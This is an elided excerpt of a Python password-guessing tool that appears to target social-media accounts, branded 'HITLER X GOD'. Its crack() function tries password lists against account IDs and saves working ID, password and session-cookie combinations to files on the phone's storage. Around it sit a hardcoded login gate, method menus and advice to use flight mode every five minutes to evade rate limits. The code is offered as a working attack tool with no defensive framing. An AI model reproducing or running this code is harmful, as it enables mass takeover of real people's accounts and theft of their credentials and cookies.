...
xudartimenai =(""" \033[32;1m[+] TO CONTACT ADMIN ENTAR""")
...
while attemps < 12345677901:
    ...
    if username == 'K' and password == 'DAI':
        print(' ')
        break
    else:
...
def setting():
    ...
    print('\033[0;97m-----------------------------------------------')
    print(" [\u001b[36m1\033[1;37m] METHOD 1(Recommend)")
    ...
    if hc in ['1','01']:
        ...
        method.append('mobile')
    saureeu = input(' \033[1;37m[\u001b[36m•\033[1;37m] Show Max Account (y/n) : ')     
    if saureeu in ['y','Y','111','01','11','1']:
    	cpp.append('y')
    else:
    	cpp.append('n')
    saurabh = input(' \033[1;37m[\u001b[36m•\033[1;37m] Show Cookies (y/n) : ')
...
def passwrd():
    ...
    print('\033[0;97m-----------------------------------------------')
    print(f' \u001b[36m>> \033[1;37m️USE FLIGHT MODE IN EVERY 5 MINUTES ')
    print('\033[0;97m-----------------------------------------------')
...
def crack(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r {P}[HITLER X GOD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():              
                open('/sdcard/HITLERXGOD-CP.txt', 'a').write(idf+'|'+pw+'\n')
                if 'y' in cpp:
                ...
                open('/sdcard/HITLERXGOD-OK.txt', 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                if 'y' in cooki:
                	print(f'\r \033[1;37m[\u001b[36m•\033[1;37m] Cookie : {H}{kuki}')
                break
